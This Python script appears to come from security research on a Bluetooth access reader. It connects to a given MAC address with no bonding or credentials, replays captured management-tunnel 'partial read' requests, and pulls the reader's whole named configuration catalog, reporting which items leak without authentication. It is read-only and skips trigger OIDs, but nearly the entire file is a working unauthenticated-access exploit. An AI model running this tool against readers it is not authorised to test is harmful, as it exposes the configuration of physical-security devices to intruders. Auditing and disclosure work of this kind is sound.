#!/usr/bin/env python3
"""Live, unauthenticated, full-catalog config pull.

Connects to the reader as a bare BLE central (no bonding, no credential), rides
the reader's own poll loop through the OPERATION_SELECTOR management tunnel
(PROTOCOL.md sec:30-31), and for every *named* config-item OID in our catalog
(config_oids.py) issues the app's own "partial read" GET
(tunnel.build_partial_read_get -- byte-exact against a real captured session,
see PROTOCOL.md sec:33) with NO keys, NO session, NO auth. Multi-part values
are reassembled across rounds. Every value that comes back is rendered via
config_render.render() into a human-readable line, not raw hex.

This generalises the earlier replay test (which only touched the ~9 OIDs one
phone screen happened to visit) to the *whole* named catalog, so it also
empirically shows which OIDs the reader actually answers unauthenticated
(mostly matching the app's own `isKnowntoBePublicRead: true` call sites) vs.
which it silently refuses (secured items -- gated behind authPriv SNMP).

Safety: read-only throughout. No SET/PUT is ever sent. A handful of OIDs are
skipped on principle -- STORE_OPERATION_PARTIAL_READ itself (the meta-OID, not
a real target) and the three bootloader/atomic-update trigger OIDs, whose GET
semantics are undefined and not worth risking even as a read.

Usage:
    python3 tools/live_full_config_pull.py <MAC> [--out prefix] [-v]
"""
import argparse
import asyncio
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from hid_rm import DATA_CHAR_UUID, framing, tunnel, config_oids, config_render

OPERATION_SELECTOR_AID = bytes.fromhex("a000000382002f000101")
FCI_OK = bytes.fromhex("6f0885060201400201009000")
SW_NOT_FOUND = bytes.fromhex("6a82")
SW_OK = bytes.fromhex("9000")

SKIP_OIDS = {
    "03000306",  # STORE_OPERATION_PARTIAL_READ -- the meta-OID itself, not a target
    "03000001",  # SWITCH_TO_SNMPLOADER -- trigger, not a value
    "0301070157",  # SWITCH_TO_DISPATCHER_BOOTLOADER -- trigger
    "030107016C",  # SWITCH_TO_SMART_MODULE_BOOTLOADER -- trigger
    "03000309",  # STORE_OPERATION_ATOMIC_UPDATE -- trigger
}

MAX_ROUNDS_PER_OID = 4    # up to 512B per item
ROUND_LEN = 128
PER_MSG_TIMEOUT = 3.0
OVERALL_TIMEOUT = 90.0


async def pull(mac: str, verbose: bool = False):
    from bleak import BleakClient

    rx = []
    ev = asyncio.Event()

    def on_notify(_, data):
        rx.append(bytes(data)); ev.set()

    c = BleakClient(mac)
    await c.connect()
    await c.start_notify(DATA_CHAR_UUID, on_notify)

    async def drain(t=PER_MSG_TIMEOUT):
        try:
            await asyncio.wait_for(ev.wait(), timeout=t)
        except asyncio.TimeoutError:
            pass
        await asyncio.sleep(0.05)
        frames = list(rx); rx.clear(); ev.clear()
        return frames

    async def send(body: bytes):
        for frag in framing.ble_fragment(body):
            await c.write_gatt_char(DATA_CHAR_UUID, frag, response=False)
            await asyncio.sleep(0.02)

    # targets: every named OID except the skip-list, in catalog order
    targets = [(oidhex, info) for oidhex, info in config_oids.CONFIG_OIDS.items()
               if oidhex.upper() not in SKIP_OIDS]
    results = {}   # oidhex -> bytes (assembled)
    pending = list(targets)
    cur_oid = None
    cur_offset = 0
    cur_buf = b""
    cur_rounds = 0
    done = False

    loop_start = asyncio.get_event_loop().time()
    while not done and c.is_connected:
        if asyncio.get_event_loop().time() - loop_start > OVERALL_TIMEOUT:
            if verbose:
                print("(overall timeout reached, stopping)")
            break
        frags = await drain()
        if not c.is_connected:
            break
        if not frags:
            continue
        body = framing.ble_reassemble(frags)
        if not body:
            continue
        ins = body[1] if len(body) > 1 else None

        if ins == 0xA4:  # SELECT
            aid = body[5:5 + body[4]] if len(body) >= 5 else b""
            await send(FCI_OK if aid == OPERATION_SELECTOR_AID else SW_NOT_FOUND)
            continue

        if ins == 0xDA:  # PUT_DATA (a result -- either session setup or our SNMP GET result)
            parsed = tunnel.parse_response(body)
            if cur_oid is not None:
                # Any PUT_DATA while we have an outstanding request is the
                # reader's answer to it -- a match with real data, or an
                # empty/short/non-matching reply, which the reader repeats
                # unchanged on every subsequent poll if we keep re-asking (a
                # refusal, not a "try again"). Either way, resolve and move on
                # so a refused item can't stall the whole sweep.
                if parsed and parsed.get("target_oid") == cur_oid and not parsed.get("encrypted") \
                        and parsed.get("value"):
                    val = parsed["value"]
                    cur_buf += val
                    cur_rounds += 1
                    if len(val) == ROUND_LEN and cur_rounds < MAX_ROUNDS_PER_OID:
                        cur_offset += ROUND_LEN  # more likely follows -- keep same OID, next round
                        await send(SW_OK)
                        continue
                    results[cur_oid] = cur_buf
                else:
                    results[cur_oid] = None  # refused / needs keys / unrecognised reply
                cur_oid = None
            await send(SW_OK)
            continue

        if ins == 0xCA:  # GET_DATA poll -- reader wants the next command
            if cur_oid is None:
                if not pending:
                    done = True
                    continue
                oidhex, info = pending.pop(0)
                cur_oid = oidhex.lower()
                cur_offset = 0
                cur_buf = b""
                cur_rounds = 0
                if verbose:
                    print(f"  requesting {info[0]} ({oidhex}) ...")
            req = tunnel.build_partial_read_get(bytes.fromhex(cur_oid), offset=cur_offset, length=ROUND_LEN)
            await send(req)
            continue

        # anything else (spontaneous frames, extension bytes) -- ignore
    try:
        await c.disconnect()
    except Exception:
        pass
    return results


def render_report(results: dict) -> str:
    lines = ["Reader config -- full unauthenticated catalog pull", ""]
    readable = {k: v for k, v in results.items() if v}
    refused = {k: v for k, v in results.items() if v is None}
    lines.append(f"{len(readable)} of {len(results)} catalogued items readable with NO authentication:\n")
    for oidhex, val in sorted(readable.items(), key=lambda kv: config_oids.CONFIG_OIDS.get(kv[0].upper(), (kv[0],))[0]):
        info = config_oids.CONFIG_OIDS.get(oidhex.upper())
        name, label = (info[0], info[1]) if info else (oidhex, "")
        dang = "  [flagged DANGEROUS to WRITE]" if info and info[3] else ""
        lines.append(f"{name:32} {oidhex}{dang}")
        lines.append(f"    {label}")
        lines.append(f"    {config_render.render(name, val)}")
        lines.append("")
    if refused:
        lines.append(f"{len(refused)} item(s) refused/needed keys (secured items):")
        for oidhex in sorted(refused):
            info = config_oids.CONFIG_OIDS.get(oidhex.upper())
            lines.append(f"  - {info[0] if info else oidhex} ({oidhex})")
    return "\n".join(lines)


async def main(mac, out_prefix, verbose):
    print(f"== live full config pull: {mac} ==")
    results = await pull(mac, verbose=verbose)
    report = render_report(results)
    print()
    print(report)
    if out_prefix:
        with open(f"{out_prefix}.txt", "w") as f:
            f.write(report)
        with open(f"{out_prefix}.json", "w") as f:
            json.dump({k: (v.hex() if v else None) for k, v in results.items()}, f, indent=2)
        print(f"\nsaved: {out_prefix}.txt  {out_prefix}.json")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("mac")
    ap.add_argument("--out", default=None, help="save report to <out>.txt/.json")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()
    asyncio.run(main(args.mac, args.out, args.verbose))
